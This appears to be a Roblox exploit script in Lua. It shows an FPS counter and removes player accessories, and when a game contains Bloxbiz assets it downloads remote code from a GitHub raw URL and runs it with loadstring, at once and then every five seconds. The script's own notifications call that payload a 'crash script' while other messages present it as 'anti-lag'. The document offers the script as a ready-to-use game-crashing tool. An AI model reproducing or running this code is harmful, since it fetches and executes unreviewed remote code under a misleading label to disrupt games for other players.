local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- Create a TextLabel to display FPS on the screen
local player = Players.LocalPlayer
local screenGui = Instance.new("ScreenGui", player.PlayerGui)
local fpsLabel = Instance.new("TextLabel")
fpsLabel.Parent = screenGui
fpsLabel.Size = UDim2.new(0, 200, 0, 50)  -- Adjust size as necessary
fpsLabel.Position = UDim2.new(0, 10, 0, 10)  -- Position in the top-left corner
fpsLabel.BackgroundTransparency = 0.5
fpsLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
fpsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
fpsLabel.Font = Enum.Font.SourceSans
fpsLabel.TextSize = 20
fpsLabel.Text = "FPS: 0"

-- Function to check if the game contains "Bloxbiz"
local function checkForBloxbiz()
    for _, item in ipairs(ReplicatedStorage:GetDescendants()) do
        if item.Name:lower():find("bloxbiz") then
            return true
        end
    end
    return false
end

-- Function to remove all accessories from a player's character
local function removeAllAccessoriesFromPlayer(player)
    local character = player.Character or player.CharacterAdded:Wait()

    -- Iterate through all descendants of the character and remove any accessories
    for _, item in pairs(character:GetDescendants()) do
        if item:IsA("Accessory") then
            item:Destroy()  -- Remove the accessory instantly
        end
    end
end

-- FPS calculation variables
local frames = 0
local fps = 0
local lastUpdateTime = tick()

-- Function to update FPS and remove accessories from all players if FPS drops below 20
RunService.RenderStepped:Connect(function()
    frames = frames + 1

    -- Update FPS every 0.1 seconds
    if tick() - lastUpdateTime >= 0.1 then
        fps = frames / (tick() - lastUpdateTime)  -- FPS calculation for 0.1s window
        frames = 0
        lastUpdateTime = tick()

        -- Update FPS display
        fpsLabel.Text = "FPS: " .. tostring(math.floor(fps))

        -- Check if FPS is below 20 and remove accessories instantly if necessary
        if fps < 20 then
            -- Remove accessories from all players
            for _, plr in pairs(Players:GetPlayers()) do
                removeAllAccessoriesFromPlayer(plr)
            end
            StarterGui:SetCore("SendNotification", {
                Title = "Low FPS Detected",
                Text = "FPS dropped below 20. Accessories removed from all players.",
                Duration = 5
            })
        end
    end

    -- Loop to keep removing accessories and refreshing the anti-lag every frame
    if checkForBloxbiz() then
        -- Remove accessories from all players continuously in RenderStepped loop
        for _, plr in pairs(Players:GetPlayers()) do
            removeAllAccessoriesFromPlayer(plr)
        end
    end
end)

-- Check if "Bloxbiz" is present in the game
if checkForBloxbiz() then
    -- Notify the player that the game is supported
    StarterGui:SetCore("SendNotification", {
        Title = "Game Supported",
        Text = "This game contains Bloxbiz and is supported.",
        Duration = 5
    })

    -- Execute the loadstring for the anti-lag script once at the start
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/stellar-dv/stellar/refs/heads/main/semiuvcrasher.txt"))()
    end)

    if success then
        -- Notify the player that the anti-lag script was executed
        StarterGui:SetCore("SendNotification", {
            Title = "Stellar Crasher Executed",
            Text = "The crash script has been executed.",
            Duration = 5
        })
    else
        warn("Failed to execute the script: " .. err)
    end

    -- Execute the loadstring every 5 seconds in a loop, and show the "Refreshing Stellar Crash" notification
    while true do
        wait(5)  -- Wait for 5 seconds before executing again
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/stellar-dv/stellar/refs/heads/main/semiuvcrasher.txt"))()
        end)
        if not success then
            warn("Failed to execute the script: " .. err)
        else
            -- Notify the player every time the script is executed with a new notification
            StarterGui:SetCore("SendNotification", {
                Title = "Refreshing Stellar Crash",
                Text = "The anti-lag script has been refreshed and executed.",
                Duration = 5
            })
        end
    end
else
    -- Notify the player that the game is not supported
    StarterGui:SetCore("SendNotification", {
        Title = "Game Not Supported",
        Text = "This game does not contain Bloxbiz.",
        Duration = 5
    })
end

-- Optional: Remove accessories when a player respawns
Players.PlayerAdded:Connect(function(plr)
    plr.CharacterAdded:Connect(function()
        if checkForBloxbiz() then
            removeAllAccessoriesFromPlayer(plr)  -- Instant removal of accessories from the player
            StarterGui:SetCore("SendNotification", {
                Title = "Accessories Removed",
                Text = "All accessories have been removed from your character.",
                Duration = 5
            })
        end
    end)
end)